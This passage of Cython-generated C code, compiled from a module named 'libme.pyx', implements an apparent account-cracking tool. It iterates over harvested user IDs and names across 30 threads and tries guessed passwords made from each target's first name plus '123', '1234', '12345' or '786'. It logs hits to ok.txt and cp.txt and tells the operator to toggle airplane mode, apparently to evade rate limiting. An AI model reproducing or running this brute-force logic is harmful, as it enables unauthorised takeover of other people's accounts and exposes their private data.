              __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
              if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 683, __pyx_L18_error)
              __Pyx_GOTREF(__pyx_t_9);
              __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
              __pyx_t_16 = NULL;
              __pyx_t_12 = 0;
              if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_10))) {
                __pyx_t_16 = PyMethod_GET_SELF(__pyx_t_10);
                if (likely(__pyx_t_16)) {
                  PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_10);
                  __Pyx_INCREF(__pyx_t_16);
                  __Pyx_INCREF(function);
                  __Pyx_DECREF_SET(__pyx_t_10, function);
                  __pyx_t_12 = 1;
                }
              }
              #if CYTHON_FAST_PYCALL
              if (PyFunction_Check(__pyx_t_10)) {
                PyObject *__pyx_temp[4] = {__pyx_t_16, __pyx_t_4, __pyx_v_uid, __pyx_t_9};
                __pyx_t_6 = __Pyx_PyFunction_FastCall(__pyx_t_10, __pyx_temp+1-__pyx_t_12, 3+__pyx_t_12); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 683, __pyx_L18_error)
                __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
                __Pyx_GOTREF(__pyx_t_6);
                __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
                __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
              } else
              #endif
              #if CYTHON_FAST_PYCCALL
              if (__Pyx_PyFastCFunction_Check(__pyx_t_10)) {
                PyObject *__pyx_temp[4] = {__pyx_t_16, __pyx_t_4, __pyx_v_uid, __pyx_t_9};
                __pyx_t_6 = __Pyx_PyCFunction_FastCall(__pyx_t_10, __pyx_temp+1-__pyx_t_12, 3+__pyx_t_12); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 683, __pyx_L18_error)
                __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
                __Pyx_GOTREF(__pyx_t_6);
                __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
                __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
              } else
              #endif
              {
                __pyx_t_17 = PyTuple_New(3+__pyx_t_12); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 683, __pyx_L18_error)
                __Pyx_GOTREF(__pyx_t_17);
                if (__pyx_t_16) {
                  __Pyx_GIVEREF(__pyx_t_16); PyTuple_SET_ITEM(__pyx_t_17, 0, __pyx_t_16); __pyx_t_16 = NULL;
                }
                __Pyx_GIVEREF(__pyx_t_4);
                PyTuple_SET_ITEM(__pyx_t_17, 0+__pyx_t_12, __pyx_t_4);
                __Pyx_INCREF(__pyx_v_uid);
                __Pyx_GIVEREF(__pyx_v_uid);
                PyTuple_SET_ITEM(__pyx_t_17, 1+__pyx_t_12, __pyx_v_uid);
                __Pyx_GIVEREF(__pyx_t_9);
                PyTuple_SET_ITEM(__pyx_t_17, 2+__pyx_t_12, __pyx_t_9);
                __pyx_t_4 = 0;
                __pyx_t_9 = 0;
                __pyx_t_6 = __Pyx_PyObject_Call(__pyx_t_10, __pyx_t_17, NULL); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 683, __pyx_L18_error)
                __Pyx_GOTREF(__pyx_t_6);
                __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
              }
              __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
              __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

              /* "libme.pyx":681
 * 				print("  [] Cp result saved in > cp.txt")
 * 				print("  [!] If No Result Turn On Airplane Mode 5 Seconds\n")
 * 				for user in self.id:             # <<<<<<<<<<<<<<
 * 					uid, name = user.split("|")
 * 					coeg.submit(self.__file__,uid, listpass.split(","))
 */
            }
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

            /* "libme.pyx":672
 * 		ask = input("  [?] Password method [y/t] : ")
 * 		if ask == "y":
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:             # <<<<<<<<<<<<<<
 * 				print("\n  \033[0;97m[*] For Example Separators : 445566,786786786")
 * 				listpass = input("  [+] Enter password : ")
 */
          }
          __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
          __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
          __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
          goto __pyx_L23_try_end;
          __pyx_L18_error:;
          __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
          __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
          __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
          __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
          __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
          __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
          __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
          /*except:*/ {
            __Pyx_AddTraceback("libme.James.__10000__", __pyx_clineno, __pyx_lineno, __pyx_filename);
            if (__Pyx_GetException(&__pyx_t_5, &__pyx_t_6, &__pyx_t_10) < 0) __PYX_ERR(0, 672, __pyx_L20_except_error)
            __Pyx_GOTREF(__pyx_t_5);
            __Pyx_GOTREF(__pyx_t_6);
            __Pyx_GOTREF(__pyx_t_10);
            __pyx_t_17 = PyTuple_Pack(3, __pyx_t_5, __pyx_t_6, __pyx_t_10); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 672, __pyx_L20_except_error)
            __Pyx_GOTREF(__pyx_t_17);
            __pyx_t_18 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_t_17, NULL);
            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
            __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
            if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 672, __pyx_L20_except_error)
            __Pyx_GOTREF(__pyx_t_18);
            __pyx_t_13 = __Pyx_PyObject_IsTrue(__pyx_t_18);
            __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
            if (__pyx_t_13 < 0) __PYX_ERR(0, 672, __pyx_L20_except_error)
            __pyx_t_19 = ((!(__pyx_t_13 != 0)) != 0);
            if (__pyx_t_19) {
              __Pyx_GIVEREF(__pyx_t_5);
              __Pyx_GIVEREF(__pyx_t_6);
              __Pyx_XGIVEREF(__pyx_t_10);
              __Pyx_ErrRestoreWithState(__pyx_t_5, __pyx_t_6, __pyx_t_10);
              __pyx_t_5 = 0; __pyx_t_6 = 0; __pyx_t_10 = 0; 
              __PYX_ERR(0, 672, __pyx_L20_except_error)
            }
            __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
            __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
            __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
            goto __pyx_L19_exception_handled;
          }
          __pyx_L20_except_error:;
          __Pyx_XGIVEREF(__pyx_t_2);
          __Pyx_XGIVEREF(__pyx_t_1);
          __Pyx_XGIVEREF(__pyx_t_14);
          __Pyx_ExceptionReset(__pyx_t_2, __pyx_t_1, __pyx_t_14);
          goto __pyx_L1_error;
          __pyx_L19_exception_handled:;
          __Pyx_XGIVEREF(__pyx_t_2);
          __Pyx_XGIVEREF(__pyx_t_1);
          __Pyx_XGIVEREF(__pyx_t_14);
          __Pyx_ExceptionReset(__pyx_t_2, __pyx_t_1, __pyx_t_14);
          __pyx_L23_try_end:;
        }
      }
      /*finally:*/ {
        /*normal exit:*/{
          if (__pyx_t_3) {
            __pyx_t_14 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_tuple__13, NULL);
            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
            if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 672, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_14);
            __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
          }
          goto __pyx_L17;
        }
        __pyx_L17:;
      }
      goto __pyx_L32;
      __pyx_L14_error:;
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      goto __pyx_L1_error;
      __pyx_L32:;
    }

    /* "libme.pyx":671
 * 		print("  [] Total id -> \033[0;91m%s\033[0;97m"%(len(self.id)))
 * 		ask = input("  [?] Password method [y/t] : ")
 * 		if ask == "y":             # <<<<<<<<<<<<<<
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 * 				print("\n  \033[0;97m[*] For Example Separators : 445566,786786786")
 */
    goto __pyx_L13;
  }

  /* "libme.pyx":684
 * 					uid, name = user.split("|")
 * 					coeg.submit(self.__file__,uid, listpass.split(","))
 * 		elif ask == "t":             # <<<<<<<<<<<<<<
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 * 					print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 */
  __pyx_t_19 = (__Pyx_PyString_Equals(__pyx_v_ask, __pyx_n_s_t, Py_EQ)); if (unlikely(__pyx_t_19 < 0)) __PYX_ERR(0, 684, __pyx_L1_error)
  if (__pyx_t_19) {

    /* "libme.pyx":685
 * 					coeg.submit(self.__file__,uid, listpass.split(","))
 * 		elif ask == "t":
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:             # <<<<<<<<<<<<<<
 * 					print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 * 					print("  [] Cp result saved in > cp.txt")
 */
    /*with:*/ {
      __Pyx_GetModuleGlobalName(__pyx_t_10, __pyx_n_s_ThreadPoolExecutor); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 685, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_10);
      __pyx_t_6 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 685, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_6);
      if (PyDict_SetItem(__pyx_t_6, __pyx_n_s_max_workers, __pyx_int_30) < 0) __PYX_ERR(0, 685, __pyx_L1_error)
      __pyx_t_5 = __Pyx_PyObject_Call(__pyx_t_10, __pyx_empty_tuple, __pyx_t_6); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 685, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_t_3 = __Pyx_PyObject_LookupSpecial(__pyx_t_5, __pyx_n_s_exit_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 685, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_3);
      __pyx_t_10 = __Pyx_PyObject_LookupSpecial(__pyx_t_5, __pyx_n_s_enter); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 685, __pyx_L33_error)
      __Pyx_GOTREF(__pyx_t_10);
      __pyx_t_17 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_10))) {
        __pyx_t_17 = PyMethod_GET_SELF(__pyx_t_10);
        if (likely(__pyx_t_17)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_10);
          __Pyx_INCREF(__pyx_t_17);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_10, function);
        }
      }
      __pyx_t_6 = (__pyx_t_17) ? __Pyx_PyObject_CallOneArg(__pyx_t_10, __pyx_t_17) : __Pyx_PyObject_CallNoArg(__pyx_t_10);
      __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
      if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 685, __pyx_L33_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __pyx_t_10 = __pyx_t_6;
      __pyx_t_6 = 0;
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      /*try:*/ {
        {
          __Pyx_PyThreadState_declare
          __Pyx_PyThreadState_assign
          __Pyx_ExceptionSave(&__pyx_t_14, &__pyx_t_1, &__pyx_t_2);
          __Pyx_XGOTREF(__pyx_t_14);
          __Pyx_XGOTREF(__pyx_t_1);
          __Pyx_XGOTREF(__pyx_t_2);
          /*try:*/ {
            __pyx_v_coeg = __pyx_t_10;
            __pyx_t_10 = 0;

            /* "libme.pyx":686
 * 		elif ask == "t":
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 * 					print("\n  \033[0;97m[] Ok result saved in > ok.txt")             # <<<<<<<<<<<<<<
 * 					print("  [] Cp result saved in > cp.txt")
 * 					print("  [!] If No Result Turn On Airplane Mode 5 Seconds\n")
 */
            if (__Pyx_PrintOne(0, __pyx_kp_s_0_97m_Ok_result_saved_in_ok_txt) < 0) __PYX_ERR(0, 686, __pyx_L37_error)

            /* "libme.pyx":687
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 * 					print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 * 					print("  [] Cp result saved in > cp.txt")             # <<<<<<<<<<<<<<
 * 					print("  [!] If No Result Turn On Airplane Mode 5 Seconds\n")
 * 					for user in self.id:
 */
            if (__Pyx_PrintOne(0, __pyx_kp_s_Cp_result_saved_in_cp_txt) < 0) __PYX_ERR(0, 687, __pyx_L37_error)

            /* "libme.pyx":688
 * 					print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 * 					print("  [] Cp result saved in > cp.txt")
 * 					print("  [!] If No Result Turn On Airplane Mode 5 Seconds\n")             # <<<<<<<<<<<<<<
 * 					for user in self.id:
 * 						uid, name = user.split("|")
 */
            if (__Pyx_PrintOne(0, __pyx_kp_s_If_No_Result_Turn_On_Airplane_M) < 0) __PYX_ERR(0, 688, __pyx_L37_error)

            /* "libme.pyx":689
 * 					print("  [] Cp result saved in > cp.txt")
 * 					print("  [!] If No Result Turn On Airplane Mode 5 Seconds\n")
 * 					for user in self.id:             # <<<<<<<<<<<<<<
 * 						uid, name = user.split("|")
 * 						ft = name.split(" ")[0]
 */
            __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_id); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 689, __pyx_L37_error)
            __Pyx_GOTREF(__pyx_t_10);
            if (likely(PyList_CheckExact(__pyx_t_10)) || PyTuple_CheckExact(__pyx_t_10)) {
              __pyx_t_5 = __pyx_t_10; __Pyx_INCREF(__pyx_t_5); __pyx_t_7 = 0;
              __pyx_t_8 = NULL;
            } else {
              __pyx_t_7 = -1; __pyx_t_5 = PyObject_GetIter(__pyx_t_10); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 689, __pyx_L37_error)
              __Pyx_GOTREF(__pyx_t_5);
              __pyx_t_8 = Py_TYPE(__pyx_t_5)->tp_iternext; if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 689, __pyx_L37_error)
            }
            __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
            for (;;) {
              if (likely(!__pyx_t_8)) {
                if (likely(PyList_CheckExact(__pyx_t_5))) {
                  if (__pyx_t_7 >= PyList_GET_SIZE(__pyx_t_5)) break;
                  #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                  __pyx_t_10 = PyList_GET_ITEM(__pyx_t_5, __pyx_t_7); __Pyx_INCREF(__pyx_t_10); __pyx_t_7++; if (unlikely(0 < 0)) __PYX_ERR(0, 689, __pyx_L37_error)
                  #else
                  __pyx_t_10 = PySequence_ITEM(__pyx_t_5, __pyx_t_7); __pyx_t_7++; if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 689, __pyx_L37_error)
                  __Pyx_GOTREF(__pyx_t_10);
                  #endif
                } else {
                  if (__pyx_t_7 >= PyTuple_GET_SIZE(__pyx_t_5)) break;
                  #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                  __pyx_t_10 = PyTuple_GET_ITEM(__pyx_t_5, __pyx_t_7); __Pyx_INCREF(__pyx_t_10); __pyx_t_7++; if (unlikely(0 < 0)) __PYX_ERR(0, 689, __pyx_L37_error)
                  #else
                  __pyx_t_10 = PySequence_ITEM(__pyx_t_5, __pyx_t_7); __pyx_t_7++; if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 689, __pyx_L37_error)
                  __Pyx_GOTREF(__pyx_t_10);
                  #endif
                }
              } else {
                __pyx_t_10 = __pyx_t_8(__pyx_t_5);
                if (unlikely(!__pyx_t_10)) {
                  PyObject* exc_type = PyErr_Occurred();
                  if (exc_type) {
                    if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
                    else __PYX_ERR(0, 689, __pyx_L37_error)
                  }
                  break;
                }
                __Pyx_GOTREF(__pyx_t_10);
              }
              __Pyx_XDECREF_SET(__pyx_v_user, __pyx_t_10);
              __pyx_t_10 = 0;

              /* "libme.pyx":690
 * 					print("  [!] If No Result Turn On Airplane Mode 5 Seconds\n")
 * 					for user in self.id:
 * 						uid, name = user.split("|")             # <<<<<<<<<<<<<<
 * 						ft = name.split(" ")[0]
 * 						if len(ft)>=6:
 */
              __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_v_user, __pyx_n_s_split); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 690, __pyx_L37_error)
              __Pyx_GOTREF(__pyx_t_6);
              __pyx_t_17 = NULL;
              if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_6))) {
                __pyx_t_17 = PyMethod_GET_SELF(__pyx_t_6);
                if (likely(__pyx_t_17)) {
                  PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
                  __Pyx_INCREF(__pyx_t_17);
                  __Pyx_INCREF(function);
                  __Pyx_DECREF_SET(__pyx_t_6, function);
                }
              }
              __pyx_t_10 = (__pyx_t_17) ? __Pyx_PyObject_Call2Args(__pyx_t_6, __pyx_t_17, __pyx_kp_s__38) : __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_kp_s__38);
              __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
              if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 690, __pyx_L37_error)
              __Pyx_GOTREF(__pyx_t_10);
              __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
              if ((likely(PyTuple_CheckExact(__pyx_t_10))) || (PyList_CheckExact(__pyx_t_10))) {
                PyObject* sequence = __pyx_t_10;
                Py_ssize_t size = __Pyx_PySequence_SIZE(sequence);
                if (unlikely(size != 2)) {
                  if (size > 2) __Pyx_RaiseTooManyValuesError(2);
                  else if (size >= 0) __Pyx_RaiseNeedMoreValuesError(size);
                  __PYX_ERR(0, 690, __pyx_L37_error)
                }
                #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                if (likely(PyTuple_CheckExact(sequence))) {
                  __pyx_t_6 = PyTuple_GET_ITEM(sequence, 0); 
                  __pyx_t_17 = PyTuple_GET_ITEM(sequence, 1); 
                } else {
                  __pyx_t_6 = PyList_GET_ITEM(sequence, 0); 
                  __pyx_t_17 = PyList_GET_ITEM(sequence, 1); 
                }
                __Pyx_INCREF(__pyx_t_6);
                __Pyx_INCREF(__pyx_t_17);
                #else
                __pyx_t_6 = PySequence_ITEM(sequence, 0); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 690, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_6);
                __pyx_t_17 = PySequence_ITEM(sequence, 1); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 690, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_17);
                #endif
                __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
              } else {
                Py_ssize_t index = -1;
                __pyx_t_9 = PyObject_GetIter(__pyx_t_10); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 690, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_9);
                __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
                __pyx_t_15 = Py_TYPE(__pyx_t_9)->tp_iternext;
                index = 0; __pyx_t_6 = __pyx_t_15(__pyx_t_9); if (unlikely(!__pyx_t_6)) goto __pyx_L45_unpacking_failed;
                __Pyx_GOTREF(__pyx_t_6);
                index = 1; __pyx_t_17 = __pyx_t_15(__pyx_t_9); if (unlikely(!__pyx_t_17)) goto __pyx_L45_unpacking_failed;
                __Pyx_GOTREF(__pyx_t_17);
                if (__Pyx_IternextUnpackEndCheck(__pyx_t_15(__pyx_t_9), 2) < 0) __PYX_ERR(0, 690, __pyx_L37_error)
                __pyx_t_15 = NULL;
                __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
                goto __pyx_L46_unpacking_done;
                __pyx_L45_unpacking_failed:;
                __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
                __pyx_t_15 = NULL;
                if (__Pyx_IterFinish() == 0) __Pyx_RaiseNeedMoreValuesError(index);
                __PYX_ERR(0, 690, __pyx_L37_error)
                __pyx_L46_unpacking_done:;
              }
              __Pyx_XDECREF_SET(__pyx_v_uid, __pyx_t_6);
              __pyx_t_6 = 0;
              __Pyx_XDECREF_SET(__pyx_v_name, __pyx_t_17);
              __pyx_t_17 = 0;

              /* "libme.pyx":691
 * 					for user in self.id:
 * 						uid, name = user.split("|")
 * 						ft = name.split(" ")[0]             # <<<<<<<<<<<<<<
 * 						if len(ft)>=6:
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 */
              __pyx_t_17 = __Pyx_PyObject_GetAttrStr(__pyx_v_name, __pyx_n_s_split); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 691, __pyx_L37_error)
              __Pyx_GOTREF(__pyx_t_17);
              __pyx_t_6 = NULL;
              if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_17))) {
                __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_17);
                if (likely(__pyx_t_6)) {
                  PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_17);
                  __Pyx_INCREF(__pyx_t_6);
                  __Pyx_INCREF(function);
                  __Pyx_DECREF_SET(__pyx_t_17, function);
                }
              }
              __pyx_t_10 = (__pyx_t_6) ? __Pyx_PyObject_Call2Args(__pyx_t_17, __pyx_t_6, __pyx_kp_s__43) : __Pyx_PyObject_CallOneArg(__pyx_t_17, __pyx_kp_s__43);
              __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
              if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 691, __pyx_L37_error)
              __Pyx_GOTREF(__pyx_t_10);
              __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
              __pyx_t_17 = __Pyx_GetItemInt(__pyx_t_10, 0, long, 1, __Pyx_PyInt_From_long, 0, 0, 1); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 691, __pyx_L37_error)
              __Pyx_GOTREF(__pyx_t_17);
              __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
              __Pyx_XDECREF_SET(__pyx_v_ft, __pyx_t_17);
              __pyx_t_17 = 0;

              /* "libme.pyx":692
 * 						uid, name = user.split("|")
 * 						ft = name.split(" ")[0]
 * 						if len(ft)>=6:             # <<<<<<<<<<<<<<
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						elif len(ft) == 3 or len(ft) == 4 or len(ft) == 5:
 */
              __pyx_t_20 = PyObject_Length(__pyx_v_ft); if (unlikely(__pyx_t_20 == ((Py_ssize_t)-1))) __PYX_ERR(0, 692, __pyx_L37_error)
              __pyx_t_19 = ((__pyx_t_20 >= 6) != 0);
              if (__pyx_t_19) {

                /* "libme.pyx":693
 * 						ft = name.split(" ")[0]
 * 						if len(ft)>=6:
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]             # <<<<<<<<<<<<<<
 * 						elif len(ft) == 3 or len(ft) == 4 or len(ft) == 5:
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 */
                __pyx_t_17 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_123); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 693, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_17);
                __pyx_t_10 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_1234); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 693, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_10);
                __pyx_t_6 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_12345); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 693, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_6);
                __pyx_t_9 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_786); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 693, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_9);
                __pyx_t_4 = PyList_New(5); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 693, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_4);
                __Pyx_INCREF(__pyx_v_name);
                __Pyx_GIVEREF(__pyx_v_name);
                PyList_SET_ITEM(__pyx_t_4, 0, __pyx_v_name);
                __Pyx_GIVEREF(__pyx_t_17);
                PyList_SET_ITEM(__pyx_t_4, 1, __pyx_t_17);
                __Pyx_GIVEREF(__pyx_t_10);
                PyList_SET_ITEM(__pyx_t_4, 2, __pyx_t_10);
                __Pyx_GIVEREF(__pyx_t_6);
                PyList_SET_ITEM(__pyx_t_4, 3, __pyx_t_6);
                __Pyx_GIVEREF(__pyx_t_9);
                PyList_SET_ITEM(__pyx_t_4, 4, __pyx_t_9);
                __pyx_t_17 = 0;
                __pyx_t_10 = 0;
                __pyx_t_6 = 0;
                __pyx_t_9 = 0;
                __Pyx_XDECREF_SET(__pyx_v_pwx, ((PyObject*)__pyx_t_4));
                __pyx_t_4 = 0;

                /* "libme.pyx":692
 * 						uid, name = user.split("|")
 * 						ft = name.split(" ")[0]
 * 						if len(ft)>=6:             # <<<<<<<<<<<<<<
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						elif len(ft) == 3 or len(ft) == 4 or len(ft) == 5:
 */
                goto __pyx_L47;
              }

              /* "libme.pyx":694
 * 						if len(ft)>=6:
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						elif len(ft) == 3 or len(ft) == 4 or len(ft) == 5:             # <<<<<<<<<<<<<<
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						else:
 */
              __pyx_t_20 = PyObject_Length(__pyx_v_ft); if (unlikely(__pyx_t_20 == ((Py_ssize_t)-1))) __PYX_ERR(0, 694, __pyx_L37_error)
              __pyx_t_13 = ((__pyx_t_20 == 3) != 0);
              if (!__pyx_t_13) {
              } else {
                __pyx_t_19 = __pyx_t_13;
                goto __pyx_L48_bool_binop_done;
              }
              __pyx_t_20 = PyObject_Length(__pyx_v_ft); if (unlikely(__pyx_t_20 == ((Py_ssize_t)-1))) __PYX_ERR(0, 694, __pyx_L37_error)
              __pyx_t_13 = ((__pyx_t_20 == 4) != 0);
              if (!__pyx_t_13) {
              } else {
                __pyx_t_19 = __pyx_t_13;
                goto __pyx_L48_bool_binop_done;
              }
              __pyx_t_20 = PyObject_Length(__pyx_v_ft); if (unlikely(__pyx_t_20 == ((Py_ssize_t)-1))) __PYX_ERR(0, 694, __pyx_L37_error)
              __pyx_t_13 = ((__pyx_t_20 == 5) != 0);
              __pyx_t_19 = __pyx_t_13;
              __pyx_L48_bool_binop_done:;
              if (__pyx_t_19) {

                /* "libme.pyx":695
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						elif len(ft) == 3 or len(ft) == 4 or len(ft) == 5:
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]             # <<<<<<<<<<<<<<
 * 						else:
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 */
                __pyx_t_4 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_123); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 695, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_4);
                __pyx_t_9 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_1234); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 695, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_9);
                __pyx_t_6 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_12345); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 695, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_6);
                __pyx_t_10 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_786); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 695, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_10);
                __pyx_t_17 = PyList_New(5); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 695, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_17);
                __Pyx_INCREF(__pyx_v_name);
                __Pyx_GIVEREF(__pyx_v_name);
                PyList_SET_ITEM(__pyx_t_17, 0, __pyx_v_name);
                __Pyx_GIVEREF(__pyx_t_4);
                PyList_SET_ITEM(__pyx_t_17, 1, __pyx_t_4);
                __Pyx_GIVEREF(__pyx_t_9);
                PyList_SET_ITEM(__pyx_t_17, 2, __pyx_t_9);
                __Pyx_GIVEREF(__pyx_t_6);
                PyList_SET_ITEM(__pyx_t_17, 3, __pyx_t_6);
                __Pyx_GIVEREF(__pyx_t_10);
                PyList_SET_ITEM(__pyx_t_17, 4, __pyx_t_10);
